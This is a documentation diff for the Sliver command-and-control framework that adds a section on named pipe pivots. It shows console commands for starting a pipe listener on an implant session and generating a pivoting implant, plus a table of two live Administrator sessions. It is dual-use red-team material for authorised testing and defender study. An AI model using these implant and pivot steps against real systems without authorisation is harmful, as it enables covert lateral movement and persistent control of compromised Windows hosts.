@@ -28,6 +28,31 @@ We can now use `generate --tcp-pivot 192.168.1.1:9898` to generate an implant th
 
 ## Named Pipe Pivots (SMB)
 
-Named pipe pivots are only supported on Windows.
+Named pipe pivots are only supported on Windows. Select a session to start a named pipe listener, and then use the `--bind` flag to specify a pipe name. Pipes are automatically started on the local machine so you only need to specify a named, remote clients are always allowed:
+
+```
+[*] Session a2615359 WARM_DRIVEWAY - 192.168.1.178:59290 (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:09:20 CST
+
+[server] sliver > use a2615359-b0a4-4463-820b-f4dbe6fb2c30
+
+[*] Active session WARM_DRIVEWAY (a2615359-b0a4-4463-820b-f4dbe6fb2c30)
+
+[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar
+
+[*] Started named pipe pivot listener \\.\pipe\foobar with id 1
+```
+
+Next we generate a named pipe implant using `generate --named-pipe 127.0.0.1/pipe/foobar` note here way may need to specify the IP address of the listener, the syntax is `<host>/pipe/<pipe name>`, which is the standard syntax for Windows named pipes.
+
+```
+[*] Session 13f9ee6b ROUND_ATELIER - 192.168.1.178:59290->WARM_DRIVEWAY-> (WIN-1TT1Q345B37) - windows/amd64 - Mon, 07 Feb 2022 10:15:11 CST
+
+[server] sliver (WARM_DRIVEWAY) > sessions
+
+ ID         Name            Transport   Remote Address                         Hostname          Username                        Operating System   Last Check-In                   Health
+========== =============== =========== ====================================== ================= =============================== ================== =============================== =========
+ 13f9ee6b   ROUND_ATELIER   pivot       192.168.1.178:59290->WARM_DRIVEWAY->   WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      Mon, 07 Feb 2022 10:15:11 CST   [ALIVE]
+ a2615359   WARM_DRIVEWAY   mtls        192.168.1.178:59290                    WIN-1TT1Q345B37   WIN-1TT1Q345B37\Administrator   windows/amd64      Mon, 07 Feb 2022 10:15:11 CST   [ALIVE]
+```
 
 
